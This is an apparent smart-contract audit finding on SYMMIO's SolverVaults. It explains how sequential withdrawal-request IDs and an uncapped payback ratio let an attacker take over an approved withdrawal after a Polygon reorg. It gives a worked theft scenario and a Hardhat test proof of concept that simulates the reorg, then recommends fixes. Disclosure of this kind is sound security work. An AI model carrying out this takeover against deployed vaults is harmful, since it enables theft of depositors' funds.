# Withdrawal request takeover due to reorgs

## Summary

The vulnerability arises from the simple numerical identification of `WithdrawRequest` instances, especially considering the expected deployment on the Polygon blockchain, which frequently experiences blockchain reorganizations (reorgs). This could allow the manipulation of withdrawal requests.

Furthermore, [the absence of a maximum limit check](https://github.com/sherlock-audit/2023-12-symm-io/blob/main/solver-vaults/contracts/SolverVaults.sol#L239) on the `_paybackRatio` parameter in the `acceptWithdrawRequest` function exacerbates the issue, potentially enabling malicious actors to exploit the system. Refer to the code snippet here for more details.

## Vulnerability Detail

Withdrawal requests are tracked using sequential numbering in the `withdrawRequests` mapping. Since the protocol is planned for launch on the Polygon network, where reorgs are a frequent occurrence (as evidenced [here](https://polygonscan.com/blocks_forked)), there is a significant risk of withdrawal request manipulation.

In typical scenarios, as mentioned during discussion, the system's bot approves withdrawals quickly based on various criteria like current balance of the contract, state of the solver in the SYMMIO platform and the request amount. However, due to the fast-paced nature of these approvals, both the request and its acceptance might be nullified by a reorg. This situation could enable the submission and approval of altered withdrawal requests following a reorg.

Additionally, the lack of a cap on the `_paybackRatio` parameter in the `acceptWithdrawRequest` function creates the possibility of accepting ratios over 100%, leading to incorrect calculations and potential exploitation.

An example scenario is outlined below:

0. Ivory has deposited 500 tokens that were transferred to SYMM.
1. Some users have deposited 1000 tokens to Vault that were not yet deposited to SYMM.
2. Alice is requesting a withdrawal for 1 token and creates a request with ID = 333.
3. Balancer accepts Alice's request with payback ratio of 120% (Alice would get 1.2 tokens back).
4. REORG happens.
5. Ivory submits a new request to withdraw 500 tokens to his address. The request gets ID = 333 (freed by reorg).
6. Ivory resends Balancer's transaction that accepts.
7. Ivory claims the withdrawal and gets 600 tokens.

The same scenario will be valid for lower payback ratio values. The attacker can obtain more favorable conditions.

## PoC

A Solidity test case is provided to demonstrate this vulnerability, where an `other` user can take over a `user`s withdrawal request, with the approval of the system.

```solidity
    describe("Withdrawal request takeover due to reorgs", function () {
        const depositAmount = decimal(500, collateralDecimals)
        const withdrawAmountInCollateralDecimals = depositAmount
        const withdrawAmount = convertToVaultDecimals(depositAmount)

        it("should allow user to claim collateral", async function () {

            let snapshotId;
            let rec
            let request

            // User deposits
            await mintFor(user, depositAmount)
            await solverVault.connect(user).deposit(depositAmount)
            // Other user deposits
            await mintFor(other, depositAmount)
            await solverVault.connect(other).deposit(depositAmount)

            // Saving snapshot for further REORG simulation
            snapshotId = await network.provider.send('evm_snapshot');

            const requestIds = [0]
            const goodPaybackRatio = decimal(70, 16n)
            const requestId = 0

            // User requests withdrawal
            await solverVaultToken.connect(user).approve(await solverVault.getAddress(), withdrawAmount)
            rec = await user.getAddress()
            await expect(solverVault.connect(user).requestWithdraw(withdrawAmount, rec))
                .to.emit(solverVault, "WithdrawRequestEvent")
                .withArgs(requestId, rec, withdrawAmountInCollateralDecimals)
            request = await solverVault.withdrawRequests(0)
            expect(request[0]).to.equal(rec)
            expect(request[1]).to.equal(withdrawAmountInCollateralDecimals)
            expect(request[2]).to.equal(RequestStatus.Pending)
            expect(request[3]).to.equal(0n)
            
            // Balancer accepts withdrawal
            await solverVault.connect(balancer).acceptWithdrawRequest(0, requestIds, goodPaybackRatio)

            // User claims
            await expect(solverVault.connect(user).claimForWithdrawRequest(requestId))
                .to.emit(solverVault, "WithdrawClaimedEvent")
                .withArgs(requestId, await user.getAddress())
            request = await solverVault.withdrawRequests(0)
            expect(request[2]).to.equal(RequestStatus.Done)
            
            // Simulating REORG
            await network.provider.send("evm_revert", [snapshotId]);

            // Other user overwrites the withdrawal request
            await solverVaultToken.connect(other).approve(await solverVault.getAddress(), withdrawAmount)
            rec = await other.getAddress()
            await expect(solverVault.connect(other).requestWithdraw(withdrawAmount, rec))
                .to.emit(solverVault, "WithdrawRequestEvent")
                .withArgs(requestId, rec, withdrawAmountInCollateralDecimals)


            request = await solverVault.withdrawRequests(0)
            expect(request[0]).to.equal(rec)
            expect(request[1]).to.equal(withdrawAmountInCollateralDecimals)
            expect(request[2]).to.equal(RequestStatus.Pending)
            expect(request[3]).to.equal(0n)
            
            // Balancer accepts withdrawal (repeated tx)
            await solverVault.connect(balancer).acceptWithdrawRequest(0, requestIds, goodPaybackRatio)

            // Other user claims
            await expect(solverVault.connect(other).claimForWithdrawRequest(requestId))
                .to.emit(solverVault, "WithdrawClaimedEvent")
                .withArgs(requestId, await other.getAddress())
            request = await solverVault.withdrawRequests(0)
            expect(request[2]).to.equal(RequestStatus.Done)
        })
    })
```

## Impact

Balancer accepts an unknown withdrawal that can be changed (different amount and receiver), in worst case leading to funds loss. 

## Code Snippet

```solidity
function requestWithdraw(
    uint256 amount,
    address receiver
) external whenNotPaused {
    require(
        SolverVaultToken(solverVaultTokenAddress).balanceOf(msg.sender) >=
            amount,
        "SolverVault: Insufficient token balance"
    );
    SolverVaultToken(solverVaultTokenAddress).burnFrom(msg.sender, amount);

    uint256 amountInCollateralDecimals = collateralTokenDecimals >=
        solverVaultTokenDecimals
        ? amount *
            (10 ** (collateralTokenDecimals - solverVaultTokenDecimals))
        : amount /
            (10 ** (solverVaultTokenDecimals - collateralTokenDecimals));

    currentDeposit -= amountInCollateralDecimals;

    withdrawRequests.push(
        WithdrawRequest({
            receiver: receiver,
            amount: amountInCollateralDecimals,
            status: RequestStatus.Pending,
            acceptedRatio: 0
        })
    );
    emit WithdrawRequestEvent(
        withdrawRequests.length - 1,
        receiver,
        amountInCollateralDecimals
    );
}
```

## Tool used

Manual Review

## Recommendation

1. Implement a validation check on the `paybackRatio` to ensure it does not exceed 100%.
2. Use a hash-based identification for withdrawal requests to prevent the possibility of replacing an existing request with a modified one.
